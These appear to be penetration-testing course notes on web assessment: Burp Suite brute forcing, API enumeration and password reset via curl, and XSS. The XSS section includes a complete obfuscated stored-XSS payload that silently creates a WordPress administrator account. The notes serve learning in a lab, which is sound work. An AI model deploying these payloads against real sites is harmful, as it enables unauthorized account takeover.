# Web Application Assessment Tools
Nmap: use `-sV` option and use `--script "http-*"` option!
Wappalyzer: look website up on https://www.wappalyzer.com/

Gobuster: bruteforce directories. E.g.
```bash
gobuster dir -u <TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -t 10
```

## Burp Suite
Launch:
```bash
burpsuite
```
Proxy: intercept request from browser to server. Can change the request!

To configure Firefox proxy:
1. Check Burp Proxy Listeners: in Burp Suite: Proxy > Options > Proxy Listeners
2. Go to: about:preferences#general > Network Settings > Settings
3. Set the Proxy settings:
  - Manual proxy configuration
  - HTTP Proxy: Proxy IP (default: 127.0.0.1)
  - Port: Proxy Port (default: 8080)
  - Also use this proxy for HTTPS

Now we can find intercepted traffic in Burp Suite: Proxy > HTTP History

Repeater: easily make new requests/modify previous requests

To map an IP to a host:
```burp
nano /etc/hosts
```

Intruder: automate some attacks

E.g.: brute force.
1. Sign-in attempt
2. Send to Intruder
3. Go to _Positions_ subtab. Press _Clear_ to clear the fields
4. Select value of password field and press _Add_
5. Go to _Payloads_ subtab. Under _Payload Options [Simple list]_ you can add a wordlist
6. Press _Start Attack_
7. Look for anomalies: different status codes, different response lengths, etc.


# Web Application Enumeration
Try to discover the technology stack:
- Host OS
- Web server software
- Database software
- Frontend/backend programming language

Developer tools!

Discover the stack by:
- Identifying URI file extensions
- Inspecting the source code
  - Tip: "prettify" the code ({} sign at the bottom in the debugger)
  - Right click on an element and click "inspect" to inspect that element
- Inspect server responses
  - "Network" tool --> Headers/response
  - Burp
  - Watch out! Can be generated e.g. by web proxy
- Inspect sitemaps (DOMAIN/sitemap.xml, DOMAIN/robots.txt)

## Enumerating and Abusing APIs
REST API: a type of API in which the server does not have to save any information about previous requests. Every request should include all the information needed to access a URN. The server does not save a session, authentication info, etc.

APIs paths are often followed by a version number, e.g.:`/api_name/v1`

You can create a pattern for Gobuster by creating a file e.g. `pattern` with contents:
```bash
{GOBUSTER}/v1
{GOBUSTER}/v2
```

We can use Gobuster to enumerate the API:
```bash
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
```

Now, we can inspect the API with curl, e.g.:
```bash
curl -i http://<TARGET_IP>/users/v1
```

We can also enumerate further on a specific API endpoint/path:
```bash
gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
```

We can use curl to perform post requests to sign-in, e.g.:
```bash
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/login
```

If we get a JWT token, we can use that too, e.g. in a PUT request to update a password:
```bash
curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```

You can move from curl to Burp Suite by appending `--proxy 127.0.0.1:8080` to the curl command. This makes it easier.

# Cross-Site Scripting (XSS)
Cause: bad data sanitzation

XSS vulnerabilities:
- Stored/persistent XSS: payload is stored in database/cached by server. Then displayed to visitors.
  - Location: forum, comment sections, product reviews, anywhere that stores user content
- Reflected: payload in a request/link. Web app takes value and places it into page content
  - Location: search fields/results, anywhere were user input is included in error messages.
- DOM-based: takes place in the _Document Object Model_ (DOM) -- browser parses HTML content and generates internal DOM representation. Sometimes, DOM can be modified with user-controlled value. DOM-based XSS can be either stored or reflected. Just happens when page's content is parsed by browser and inserted JavaScript is executed.

XSS payloads are executed by the user's browser, not the web application!

### JavaScript
Browser contains JavaScript engine which runs the JavaScript code.

Browser processes server's HTTP response which contains HTML, creates a DOM tree and renders it. JavaScript accesses and modifies the page's DOM to make the website more interactive. Therefore, if you can inject JavaScript into the application, we can modify the DOM, which means we can redirect login forms, extract passwords, steal cookies, etc.

Example JavaScript:
```JavaScript
function multiplyValues(x,y) {
  return x * y;
}
 
let a = multiplyValues(3, 5)
console.log(a)
```

### Identifying XSS Vulnerabilities
1. Look for potential entry points (input fields)
2. Input special characters to see if any return unfiltered: `< > ' " { } ;`. If these are not removed/encoded, there may be an XSS vulnerability, since the characters are interpreted as code by the application.
   - `< >` are used to denote elements
   - `{ }` are used to declare functions
   - `' "` are used to denote strings
   - `;` is used to mark the end of a statement
  
Encoding:
- URL encoding or percent-encoding: convert non-ASCII/reserved characters into ASCII (usually with %-sign, such as `%20` for a space)
- HTML encoding or character references: characters that normally have special meanings are encoded, so that the actual character is displayed rather than interpreted

May need to use different (sets of) characters depending on where input is included. May need to include our own _script_ tag if it is added between _div_s.

### Basic XSS
Often you can look at the source code and see if you can see an XSS vulnerability there.

Test payload: `<script>alert(69)</script>`

### Privilege Escalation via XSS
To steal cookies:
- _Secure_ flag: instruction to only send cookie over encrypted connection
- _HTTPOnly_ flag: instruction to deny JavaScript access to cookie. If not: XSS can be used to steal the cookie!

Usually: session cookies are the most useful, However, if HTTPOnly is enabled, you probably need to find another angle.

Example: crafting JavaScript function that adds another WordPress admin account.
1. Create JavaScript that fetched WordPress admin nonce

_nonce_: server-generated token included in each HTTP request to add randomness and prevent CSRF attacks
CSRF attacks (Cross-Site-Request-Forgery): social engineering attack in which victim clicks malicious link to perform preconfigured action on behalf of the user. E.g. disguising a malicious link under harmless text. Nonce prevents this, since the attacker could not know the token.

To get the nonce, we can use some JavaScript:
```JavaScript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```
This will make a new request for /wp-admin/user-new.php, look for the nonce using regex and save it.

Now we can create a function to create a new admin user:
```JavaScript
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

We can minify this and encode it
1. https://jscompress.com
2. Encode
```JavaScript
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

Now, we can use curl to put some more JavaScript around this, use this as a user agent and send it to Burp:
```bash
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" --proxy 127.0.0.1:8080
```

Since this is stored in the WordPress database, the legitimate admin only needs to visit the location where this was stored.
